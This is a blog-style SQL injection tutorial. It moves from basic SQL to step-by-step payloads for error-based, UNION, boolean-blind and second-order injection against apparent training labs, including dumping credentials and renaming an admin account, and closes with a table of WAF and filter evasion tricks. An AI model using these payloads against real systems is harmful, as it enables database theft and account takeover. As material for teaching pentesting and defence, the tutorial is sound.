Portfolio
  • Home
  • Blog
  • Certificates

SQL Injection

June 2, 2025

Categories: blog, cybersecurity

Tags: red team, pentesting, bug bounty, ctf

SQL (Structured Query Language)

SQL is a powerful language used to interact with relational databases. It lets you fetch, update, insert, and remove data using clear commands called statements.

In this guide, we’ll stick with MySQL-style syntax. It’s important to know SQL is not case-sensitive, so commands like SELECT, select, and SeLeCt all behave the same.

SELECT – Retrieving Data

Let’s say we have a table named books.

SQL 

select * from books;

This pulls all columns and rows from the books table.

Sample Output:

id title author genre
1 Cyber Shadows Max Hollow Thriller
2 Datafall Mira Grant Sci-Fi
3 Broken Protocol L. Pierce Mystery

To return only certain columns:

SQL 

select title, author from books;

Output:

title author
Cyber Shadows Max Hollow
Datafall Mira Grant
Broken Protocol L. Pierce

LIMIT – Restricting Results

SQL 

select * from books limit 2;

Returns the first 2 rows from the table.

To skip rows:

SQL 

select * from books limit 1,2;

This skips the first row and returns the next two.

WHERE - Filtering Data

Use WHERE to fetch rows based on conditions:

SQL 

select * from books where genre = 'Thriller';

Output:

id title author genre
1 Cyber Shadows Max Hollow Thriller

Use != to exclude:

SQL 

select * from books where genre != 'Thriller';

Use OR and AND to stack conditions:

SQL 

select * from books where genre = 'Sci-Fi' or genre = 'Mystery';
SQL 

select * from books where author = 'Mira Grant' and genre = 'Sci-Fi';

LIKE – Pattern Matching

Use LIKE with % as a wildcard.

Starts with:

SQL 

select * from books where author like 'M%';

Returns rows where the author starts with “M”.

Ends with:

SQL 

select * from books where title like '%l';

Contains:

SQL 

select * from books where title like '%ro%';

UNION – Merging Results from Multiple Tables

Say we have a books table and a magazines table:

books Table:

title author
Cyber Shadows Max Hollow
Datafall Mira Grant

magazines Table:

title editor
HackWorld Monthly Erin Voss
Tech Digest Dan Irvine

Combine both into one list:

SQL 

select title, author from books union select title, editor from magazines;

INSERT – Adding Data

SQL 

insert into books (title, author, genre) values ('Echoes of Null', 'J. Drayke', 'Cyberpunk');

Now books has a new row:

id title author genre
4 Echoes of Null J. Drayke Cyberpunk

UPDATE – Modifying Data

SQL 

update books set genre = 'Tech Noir' where title = 'Echoes of Null';

Changes the genre of one specific book.

DELETE – Removing Data

SQL 

delete from books where author = 'Max Hollow';

Deletes all books by Max Hollow.

Or wipe the table:

SQL 

delete from books;

All rows gone but the table still exists.

What is SQL Injection (SQLi)?

SQL Injection (SQLi) is a vulnerability that occurs when an application takes user input and drops it directly into an SQL query without proper validation or sanitization. This opens the door for attackers to manipulate the query and extract, bypass, or destroy data.

It’s like handing your database a loaded gun… and letting the user pull the trigger.

Real-World Example – The Blog Post Trap

Let’s imagine a blog site where each post has a unique ID. Posts may be public (ready to read) or private (still in draft).

A standard blog post URL might look like this:

SQL 

https://cyberjournal.io/post?id=4

Under the hood, the backend may run an SQL query like this:

SQL 

SELECT * FROM posts WHERE id=4 AND is_public=1 LIMIT 1;

  • id=4 — tells the database which post to fetch.

  • is_public=1 — filters out private drafts.

  • LIMIT 1 — ensures only one row is returned.

If post 4 is public, you see it. If it’s private (is_public=0), you get a “not found” page.

Where It Breaks Injecting Malicious Input

Here’s the catch: if the id parameter is used directly in the query without filtering it’s open to abuse.

Let’s say post 7 is a private draft.

You try this URL:

SQL 

https://cyberjournal.io/post?id=7

You get nothing, as expected.

But what if you sneak in this instead?

SQLI 

https://cyberjournal.io/post?id=7 OR 1=1

Now the SQL query becomes:

SQL 

SELECT * FROM posts WHERE id=7 OR 1=1 AND is_public=1 LIMIT 1;

Due to logical operator precedence, 1=1 evaluates as true bypassing the intent of the filter. But more dangerously, some devs might write queries like this:

SQL 

SELECT * FROM posts WHERE id=$id;

And now, you pass:

SQLI 

https://cyberjournal.io/post?id=7;--

That transforms the SQL into:

SQLI 

SELECT * FROM posts WHERE id=7;--

-- is the SQL comment syntax. It disables anything after it. So if the app tried to append AND is_public=1, it gets ignored.

You now view a private post.

⚙️ Why This Happens

It all boils down to trusting user input. SQL engines don’t care where the data comes from they just execute the final string. If the app doesn’t escape or bind inputs safely, attackers write their own logic inside your query.

In-Band SQL Injection: One Path In. One Path Out.

In-Band SQLi is the loudest, simplest, and most direct form of SQL Injection. It’s called “In-Band” because:

The request and response both travel the same channel usually the web browser.

You shoot the payload ➜ the app executes it ➜ the results spill out right on the page.

It’s fast. It’s obvious. And if it works, you’re basically jacked into the DB like it’s 1999.

Use Case: Comment Viewer

Imagine a basic URL:

SQL 

https://comments.sys/view.php?cid=10

The backend query might look like:

SQL 

SELECT name, message FROM comments WHERE cid=10;

Nothing fancy. But if the input isn’t sanitized, try this:

SQLI 

https://comments.sys/view.php?cid=10 UNION SELECT user(), database();

Page now shows:


Name: root@localhost
Message: blogdb

No authentication. No session. Just raw data harvested through the same request channel.

Subtypes of In-Band SQLi

1. Error-Based SQL Injection

This one rides on the error output from the database itself. If the backend is verbose (MySQL, MSSQL, PostgreSQL, etc.), you can throw crafted payloads and get the structure of the database dumped back at you.

Example:

Original URL:

SQL 

https://comments.sys/view.php?cid=10

Try this:

SQLI 

https://comments.sys/view.php?cid=10 AND 1=CONVERT(int,(SELECT @@version));

If error messages are on, you get:

Error: Conversion failed when converting the varchar value 'Microsoft SQL Server 2019' to data type int.

You now know the DB engine and version.

Keep chaining errors and use the messages to:

  • Discover table names

  • Leak column names

  • Reveal datatypes

  • Map the entire schema

Pro tip: Use GROUP BY, ORDER BY, or broken CAST()/CONVERT() to squeeze out leaks.

2. UNION-Based SQL Injection

This is your primary data extraction tool. You piggyback off a legit SELECT and bolt your own query onto it using the UNION keyword.

But here’s the catch:

  • You must match the column count of the original query.

  • The data types must align.

Let’s walk it.

Original vulnerable query:

SQL 

SELECT title, content FROM articles WHERE id=3;

First test: Find column count.

SQLI 

?id=3 ORDER BY 1-- ✅
?id=3 ORDER BY 2-- ✅
?id=3 ORDER BY 3-- ❌ (error)

Means 2 columns.

Now inject:

SQLI 

?id=3 UNION SELECT username, password FROM admins--

Output:

SQLI 

Title: admin
Content: s3cur3p@ssw0rd

You just leaked creds. Over the front door. In plain sight.

Error-Based SQL Injection Walkthrough

We’re looking at a simple blog site vulnerable to error-based SQL Injection.

Test URL:


http://localhost:8000/index.php?id=1

Step 1: Identify the Injection Point

To confirm an SQLi vulnerability, we need to break the query and look for errors.

Let’s tweak the URL slightly:

SQLI 

http://localhost:8000/index.php?id=1'

we get this classic error:

Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1...

That error confirms the input is unsanitized and directly injected into an SQL statement. We’re in.

Step 2: Column Count with UNION Injection

To extract data, we’ll use the UNION SELECT method. But first, we need to figure out how many columns the original query returns.

Try:

SQLI 

http://localhost:8000/index.php?id=1 UNION SELECT 1

If it throws:

The used SELECT statements have a different number of columns...

…then the number of columns doesn’t match. Keep adding placeholders until it stops erroring:

1 UNION SELECT 1,2 1 UNION SELECT 1,2,3

Once it works, we know the original query returns 3 columns.

Step 3: Control the Output

Right now, the site displays the first row from the results. We want it to show our injected data instead of the real article.

To make the original query return no results, change the ID to something invalid, like 0:

SQLI 

http://localhost:8000/index.php?id=0 UNION SELECT 1,2,3

Now we control the output. Time to exfiltrate.

Step 4: Get the Current Database

Let’s see what database we’re in:

0 UNION SELECT 1,2,database()

It returns:

sqli_one

Step 5: List All Tables in the Database

We’ll use the internal information_schema database to get table names:

0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

We get:

article,staff_users

staff_users sounds spicy

Step 6: Discover Table Columns

Now let’s get the column names inside staff_users:

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

Result:

id,username,password

Now we’re ready to extract creds.

Step 7: Dump the Data

Let’s pull the actual data from staff_users. To keep it readable, we format the output with a colon and line breaks:

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

We’ve got usernames and hashed passwords on separate lines. Mission success.

Always remember: SQLi like this happens because of poor input sanitization and unsafely constructed SQL queries. Use parameterized queries (prepared statements) to shut this down.

Boolean-Based Blind SQL Injection (SQLi)

Boolean-Based SQL Injection is a form of blind injection where the attacker doesn’t see database output directly but instead infers it through differences in the application’s behavior. The application’s response is based on true/false conditions, allowing attackers to slowly extract data.

For example, a page might respond with “user found” when a condition is true, and “no user found” when false. That boolean switch is what we exploit.

Scenario

Imagine a web app that checks if a username exists:

  • ✅ http://localhost:8080/user.php?id=admin → Response: user found

  • ❌ http://localhost:8080/user.php?id=admin123 → Response: no user found

This tells us that admin is a valid username. Now let’s exploit this vulnerability using SQL Injection techniques.

Step 1: Identifying Column Count with UNION SELECT

To execute a UNION-based injection, we must match the number of columns in the original query. We incrementally test:

SQLI 


-   ❌ `admin123' UNION SELECT 'col1'-- -`

-   ❌ `admin123' UNION SELECT 'col1','col2'-- -`

-   ✅ `admin123' UNION SELECT 'col1','col2','col3'-- -`

Once we see “user found”, the column count (3) is confirmed.

Step 2: Enumerating the Database Name

You can extract the database name using the database() function:

SQLI 

admin123' UNION SELECT database(), 'x', 'x'-- -

But in a true blind context, we need to guess characters one-by-one using SUBSTRING():

SQLI 

admin123' UNION SELECT 'x', 'x', 'x' FROM dual WHERE SUBSTRING(database(),1,1)='b'-- -

If the result is “user found”, then the first character is ‘b’.

You continue checking each character position:

SUBSTRING(database(), 1, 2) = 'bl'

SUBSTRING(database(), 1, 3) = 'bli'

Until you reach:

SUBSTRING(database(), 1, 10) = 'blind_sqli'

Now we know the database is called blind_sqli.

Step 3: Enumerating Table Names

We use information_schema.tables to get table names in this DB:

SQLI 

admin123' UNION SELECT 'x','x','x' FROM information_schema.tables WHERE table_schema = 'blind_sqli' AND SUBSTRING(table_name,1,1)='u' LIMIT 0,1 -- -

Continue guessing until:

SUBSTRING(table_name,1,5)='users'

Confirmed: The table is users.

Step 4: Enumerating Column Names

We now use information_schema.columns:

SQLI 

admin123' UNION SELECT 'x','x','x' FROM information_schema.columns WHERE table_schema = 'blind_sqli' AND table_name = 'users' AND SUBSTRING(column_name, 1, 1) = 'u' LIMIT 0, 1 -- -

Repeat until you find:

SUBSTRING(column_name, 1, 8) = 'username'

SUBSTRING(column_name, 1, 8) = 'password'

Columns are: username, password.

Step 5: Enumerating Usernames from the users Table

Now that you know the structure, time to exfil actual data:

SQLI 

admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='a' LIMIT 0,1 -- -
SQLI 

admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(username,1,1)='j' LIMIT 0,1 -- -

Keep testing until you identify the value:

SUBSTRING(username, 1, 5) = 'admin'

Confirmed user: admin

Step 6: Enumerating the Password

Same technique applies for password field:

SQLI 

admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 3) = 'sup' LIMIT 0, 1 -- -
SQLI 

admin123' UNION SELECT 'x','x','x' FROM users WHERE SUBSTRING(password, 1, 11) = 'supersecret' LIMIT 0, 1 -- -

Confirmed password: supersecret

This process may seem slow, but it works even when there’s no error message or visible output only behavior changes. Boolean-based blind SQLi depends on:

  • Controlled injection point (like id= parameter)

  • Application responses that clearly reflect true vs false outcomes

  • Use of functions like SUBSTRING(), database(), information_schema

Understanding Second-Order SQL Injection: The Silent Threat

When we think about SQL injection (SQLi), the classic image is of attackers injecting malicious SQL commands directly into input fields causing immediate havoc like data leaks or corruption. But not all SQL injections flash their danger right away. Enter Second-Order SQL Injection a stealthier, more insidious cousin in the SQLi family.

What is Second-Order SQL Injection?

Second-Order SQL Injection (sometimes called stored SQLi) happens when malicious user input is saved in the database without causing any immediate SQL errors or suspicious behavior. The attack payload remains dormant harmless at first glance because the data isn’t directly executed as SQL during initial insertion.

The real danger emerges later, when this stored data is retrieved and used in another SQL query without proper sanitization or escaping. This delayed injection point is what makes second-order SQLi tricky to detect and remediate.

In short:

  • The attacker injects malicious SQL code into the database via one part of the app.

  • The injected payload is stored as normal data.

  • Later, when the app uses this stored data in another SQL query (the “second order”), the malicious payload executes, enabling attacks like privilege escalation, data tampering, or data leakage.

Why Is This Attack Hard to Catch?

Standard input validation or sanitization techniques often focus on preventing immediate SQLi input that breaks queries right away. But second-order SQLi bypasses this because the initial input looks harmless, causing no errors during insertion.

Detection systems monitoring input fields may see nothing wrong, and code reviewers might miss vulnerabilities in seemingly “safe” retrieval queries, assuming data in the database is clean.

Real-World Scenario: Our Vulnerable Web App

Let’s ground this in a practical example using the vulnerable PHP web app we built for training:

In our scenario, we’re dealing with a vulnerable PHP web application that lets users log in and update their username.

Let’s walk through the steps an attacker might take:

Step 1: Log in as a Normal User

We start by logging in as a regular user in this case, user1.

After logging in, we’re taken to the home page, which lists all users. We can also visit each user’s profile page including our own and the admin’s. So far, everything looks normal.

Step 2: Change Our Own Username

The app allows users to change their own usernames from the profile page. Let’s test this feature by updating user1 to user2. We enter the new name in the input field and submit the form.

SQLI 

UPDATE users SET username='user2' WHERE username='user1'

This query runs successfully because we are user1 and we’re updating our own username. No issues here functionality works as expected.

Step 3: What Happens if We Inject SQL?

Now, let’s try to abuse the update functionality by injecting raw SQL instead of a clean new username.

We change our input to the following payload:

SQLI 

hacked_admin' WHERE username='admin' -- -

Let’s break it down:

SQLI 

UPDATE users SET username='hacked_admin' WHERE username='admin' -- -'

Here’s what this does:

  • 'hacked_admin' is the new username we want to assign.

  • WHERE username='admin' overrides the default condition (WHERE username='user1') that restricts updates to the currently logged-in user.

  • -- - is a SQL comment that tells the database to ignore the rest of the query, including any part added by the app logic (like the real username check).

So instead of updating our own account, the query updates admin’s username, even though we shouldn’t have permission to do that.

Step 4: Check the Results

After submitting the payload, we return to the home page.

Now, instead of admin, we see a user named hacked_admin in the user list. That’s confirmation the SQL injection worked we just used our own profile update form to silently overwrite the admin’s username.

This is the perfect example of a second-order SQL injection:

  • The injection payload was stored as seemingly harmless input.

  • Later, it was executed as part of an SQL command, causing unexpected behavior and a privilege bypass.

Now, if we want to demonstrate a proof of concept (PoC), we don’t actually want to change anyone’s username unless you’ve created a separate test account, modifying existing users would be out of scope. To safely showcase the vulnerability without affecting any data, we can use a payload that triggers a delay, such as:

SQLI 

user1', username = 'user1' WHERE '1'='1' AND SLEEP(5) -- -

This payload executes the SLEEP(5) function to delay the response, confirming the SQL injection vulnerability without modifying any user data.

Bypassing SQLi Filters Using URL Encoding: Why It Matters

Before we dive into bypass techniques, let’s break down why URL encoding is a key weapon in evading SQL injection (SQLi) protections.

What is URL Encoding?

URL encoding transforms special characters into a % sign followed by their ASCII hex value. For example, the classic payload:

SQLI 

' OR 1=1--

becomes:

SQLI 

%27%20OR%201%3D1--%20

This encoding masks the payload from naïve filters, letting it slip through initial checks because the web app might decode it after filtering, effectively bypassing string-matching rules.

The Challenge: Filters in Place

The Setup: Our Web App, Now With Filters Remember the vulnerable web app we worked on before? The one where SQLi was wide open?

This Time: Showing the Actual Query for Clarity

To help you see exactly how this works, I’m showing the generated SQL query when we update the username. For example, if we change the user’s name from user2 to user3, the app sends:

SQL 

UPDATE users SET name = 'user3' WHERE username = 'randomuser'

This confirms how the input is incorporated into the SQL statement, which helps us craft payloads that manipulate this structure.

This time, it’s got a basic blacklist filter in place, designed to block dangerous keywords and characters like:

SQL 

// Case-sensitive blacklist filter
$special_chars = array(
    "OR", "or", "AND", "and", "UNION", "SELECT", "WHERE", "'",
    " ",    // space
    "\t",   // tab
    "\n",   // newline
    "\r",   // carriage return
    "\0",   // null byte
);

Trying to send the same payload:

SQLI 

hacked_admin' WHERE username='admin' -- -

gets blocked outright because it contains filtered keywords like WHERE, spaces ‎ , and single quotes '.

Here’s Where URL Encoding Steps Up

  • Spaces: blocked as literal spaces, but %20 flies under the radar.

  • Keywords like WHERE: filtered in exact case, but case-sensitive, so wHeRe or WhErE can bypass.

  • Single quotes ': encoded as %27.

Rebuilding our payload with these tricks:

SQL 

hacked_admin%27%20wHeRe%20username%3D%27admin%27%20--%20

This stealthy version avoids direct detection by the filter but still executes as intended after decoding by the database.

No-Quote SQL Injection: Attacking Without Quotes

Sometimes when you’re probing a web app for SQL injection (SQLi) vulnerabilities, you’ll run into a filter that strips or escapes quotes (' or "). Normally, these quotes are essential in crafting payloads especially when targeting string-based SQL queries.

But here’s the twist: quotes aren’t always necessary. There are stealthier methods to slip your payload through. We call this No-Quote SQL Injection. Let’s break it down.

1. Numerical Injection (Pure Logic-Based Payloads)

If the backend is working with numeric data types (like user_id, price, or anything not enclosed in quotes), you can craft injections that don’t use quotes at all.

Example:

SQL 

?id=1 OR 1=1

No quotes. No strings. Just logic. If the original query looks like:

SQL 

SELECT * FROM users WHERE id = 1;

your injection turns it into:

SQL 

SELECT * FROM users WHERE id = 1 OR 1=1;

bypass achieved. The OR 1=1 clause is always true, so it dumps all records.

2. SQL Comments to Kill the Query

SQL comments (--, #, or /* */) are used to nullify the rest of the original query after your payload. This is super useful if you’re dealing with leftover query logic that could break your injection.

Example:

SQL 

?id=1--

Imagine the original backend query is:

SQL 

SELECT * FROM users WHERE id = 1 AND active = 1;

With the injection:

SQL 

SELECT * FROM users WHERE id = 1-- AND active = 1;

Everything after -- is ignored. You just chopped off the rest of the query. Mission complete.

3. String Building Without Quotes – Using CONCAT()

What if you need to inject strings (like usernames), but quotes are blocked? Enter: hex values + CONCAT().

Example:

SQL 

CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)

This builds the string "admin" using hex ASCII values.

Why it works:

  • Bypasses quote filters.

  • Looks like a function call to the DB.

  • Flies under many WAFs.

No-Spaces Allowed? No Problem

Now, let’s say the target also filters out spaces. That’s another layer of defense but it’s just an obstacle, not a dead end.

1. Replace Spaces with Comments

SQL allows multi-line comments using /**/. You can use these to replace spaces in your payload.

Example:

SQL 

SELECT/**/name/**/FROM/**/users

This still executes as:

SQL 

SELECT name FROM users

It’s fully functional and filters that look for the word SELECT followed by a space won’t catch it.

2. Tab (\t) and Newline (\n) Injection

Filters may block ASCII space (0x20), but not other whitespace. Try:

  • Tab: \t or %09

  • Newline: \n or %0A

Example:

SQL 

SELECT%09name%0AFROM%09users

Some backends will normalize these characters, giving you the same result as using spaces.

3. URL-Encoded Whitespace Payloads

Other lesser-known whitespace characters:

  • %0C (form feed)

  • %0D (carriage return)

  • %A0 (non-breaking space)

These can be strategically dropped into a URL-encoded injection payload to sneak past naïve filters.

Note

When dealing with heavy filtering, understand how the server parses input. The goal is to craft a syntactically valid query while avoiding the exact patterns WAFs are trained to detect.

No-quote and no-space payloads are all about adaptive syntax evasion. Think like a compiler. Feed it what it accepts, not what looks normal.

Bypassing Basic SQL Injection Filters Using Alternate Whitespace Characters

Imagine you’re pentesting a web app. The login form has a filter on the username input to block common SQL keywords and spaces trying to stop classic SQL injection attempts.

Here’s what the developer coded:

SQL 

$filters = [' ', 'AND', 'and', 'OR', 'or', 'UNION', 'SELECT'];
foreach ($filters as $filter) {
    $username = str_replace($filter, '', $username);
}

This means any spaces and SQL keywords like AND, OR, UNION, SELECT get wiped out from the username before the query runs.

The Challenge

You try a basic SQL injection payload to bypass authentication:

SQLI 

1' OR 1=1 --

But the filter instantly strips spaces and keywords your input becomes:

SQLI 

1'OR1=1--

This mangled input breaks the SQL syntax, causing an error.

You then try URL encoding spaces and special characters:

SQLI 

1%27%20OR%201=1%20--+

But no dice the server still filters spaces after decoding, so the spaces are removed again, and the payload fails.

Finding the Weak Spot

The filter only targets literal space characters (0x20) and keywords in uppercase or lowercase. But it does not filter other whitespace characters, such as:

  • Tabs (%09)

  • Newlines (%0A)

  • Carriage returns (%0D)

SQL parsers treat these alternate whitespace characters just like spaces when parsing queries.

The Bypass

So instead of spaces, you replace them with newline characters (%0A):

SQLI 

1'%0A||%0A1=1%0A--%27

This payload, when URL-decoded, looks like:

SQLI 

1'
||
1=1
--
'

The SQL engine reads the newlines as spaces and interprets the query as:

SQL 

SELECT username, password FROM users WHERE username = '1' || 1=1 --';

  • || is the logical OR operator in some SQL dialects.

  • 1=1 is always true.

  • -- comments out the rest of the query.

The result? The WHERE clause always passes, granting unauthorized access.

Bypassing WAFs and Filters in SQL Injection: A Tactical Breakdown

When dealing with Web Application Firewalls (WAFs) or filter-based defenses, no single SQL injection technique is guaranteed to work across all environments. Filters are often tailored to block known attack patterns but they’re not perfect. Understanding their weaknesses and employing a flexible, adaptive mindset is key to bypassing them.

Below is a curated list of common filtering scenarios, along with practical evasion techniques and real-world examples:

Scenario Description Bypass Example
Keywords like SELECT are blocked WAFs may block exact keyword matches. Bypass by changing case or inserting inline comments. SElEcT * FrOm users or SE/**/LECT * FROM/**/users
Spaces are filtered Spaces are removed or blocked. Use alternative whitespace (e.g., %0A, %09) or inline comments. SELECT%0A*%0AFROM%0Ausers or SELECT/**/username/**/FROM/**/users
Logical operators like AND, OR are banned Filters block logical operators. Use alternatives like &&, ||, or encoded logic. username = 'admin' && password = 'pass' or username = 'admin'%0A
Keywords like UNION, SELECT are blocked Filters block keywords. Encode with CHAR(), Unicode, or hex to evade. SELECT * FROM users WHERE username = CHAR(0x61,0x64,0x6D,0x69,0x6E)
Deep keyword filtering (OR, AND, SELECT, UNION) Multiple keywords are filtered. Combine obfuscation: string functions, comments, concatenation. SELECT * FROM users WHERE username = CONCAT('a','d','m','i','n') or SElEcT/**/username/**/FROM/**/users

Adapting to the Unknown: Patience and Precision

In real-world engagements, you won’t always have clear feedback on what’s being filtered or blocked. WAFs may silently drop requests, sanitize payloads, or serve generic error pages making your job harder. That’s why SQLi is often trial-and-error based, especially under heavy defenses.

Each target environment is unique:

  • Some filter payloads at the frontend.

  • Others rely on backend input sanitization.

  • Many use both layered defenses.

To break through:

  • Start small test with basic payloads.

  • Probe with variations change syntax, encoding, and structure.

  • Log everything track responses, delays, and subtle changes.

It’s a chess match, not a sprint. WAFs can be defeated but only if you stay unpredictable.

← Back to blog
